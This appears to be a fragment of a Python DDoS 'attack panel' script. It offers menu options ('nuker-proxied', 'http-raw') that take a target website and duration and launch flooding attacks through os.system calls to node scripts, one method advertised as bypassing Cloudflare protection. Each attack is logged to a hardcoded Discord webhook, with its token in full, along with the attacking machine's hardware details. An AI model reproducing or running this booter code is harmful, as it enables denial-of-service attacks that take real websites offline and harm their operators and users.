                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()

                load()
                license()
                menu()
            if kies == "nuker-proxied":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mwebsite-nuker-https-proxied \033[31m: \033[36m Proxied Attack, Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                websitenukerwebsite1 = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite1}')
                    
                embed.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
                embed.add_embed_field(name='Method:', value='nuker-proxied')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(sendattackwebsitenuker1)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite1}')
                    
                embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
                embedx.add_embed_field(name='Method:', value='nuker-proxyless')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()

                load()
                license()
                menu()
            if kies == "http-raw":
                os.system('clear')
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mhttp-raw \033[31m: \033[36m Strong RAW ATTACK\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                targetraw = input('\033[31m\033[1m⮞ \033[0m\033[96mWebsite \033[31m:\033[36m\033[31m')
                rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                tip()
                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embed.set_timestamp()


                embed.add_embed_field(name='Attack Send to:', value=f'{targetraw}')
                    
                embed.add_embed_field(name='Time:', value=f'{rawtime}')
                embed.add_embed_field(name='Method:', value='http-raw')
                embed.add_embed_field(name='Machine:', value=f'{machine}')
                embed.add_embed_field(name='System OS:', value=f'{systemos}')
                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhook.add_embed(embed)
                response = webhook.execute()
                os.system(sendrawhttp)
                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                embedx.set_timestamp()


                embed.add_embed_field(name='Attack Stopped for:', value=f'{targetraw}')
                    
                embed.add_embed_field(name='Time:', value=f'{rawtime}')
                embedx.add_embed_field(name='Method:', value='http-raw')
                embedx.add_embed_field(name='Machine:', value=f'{machine}')
                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                webhookx.add_embed(embedx)
                responsex = webhookx.execute()

                load()
                license()
                menu()

            if kies == "fixer":
                os.system('./fixer')
            if kies == "exit":
                sys.exit()
            else:
                wrongoption()
                load()
                license()
                menu()
    except KeyboardInterrupt:
        print('Keyboard Interruption')
        load()
        license()
        menu()
    except EOFError:
        print('EOF Error')
        load()
        license()
        menu()
    except IndexError:
        print('Index Error')
        load()
        license()
        menu()
    except FileExistsError:
        print("Error")
        load()
        license()
        menu()

menu()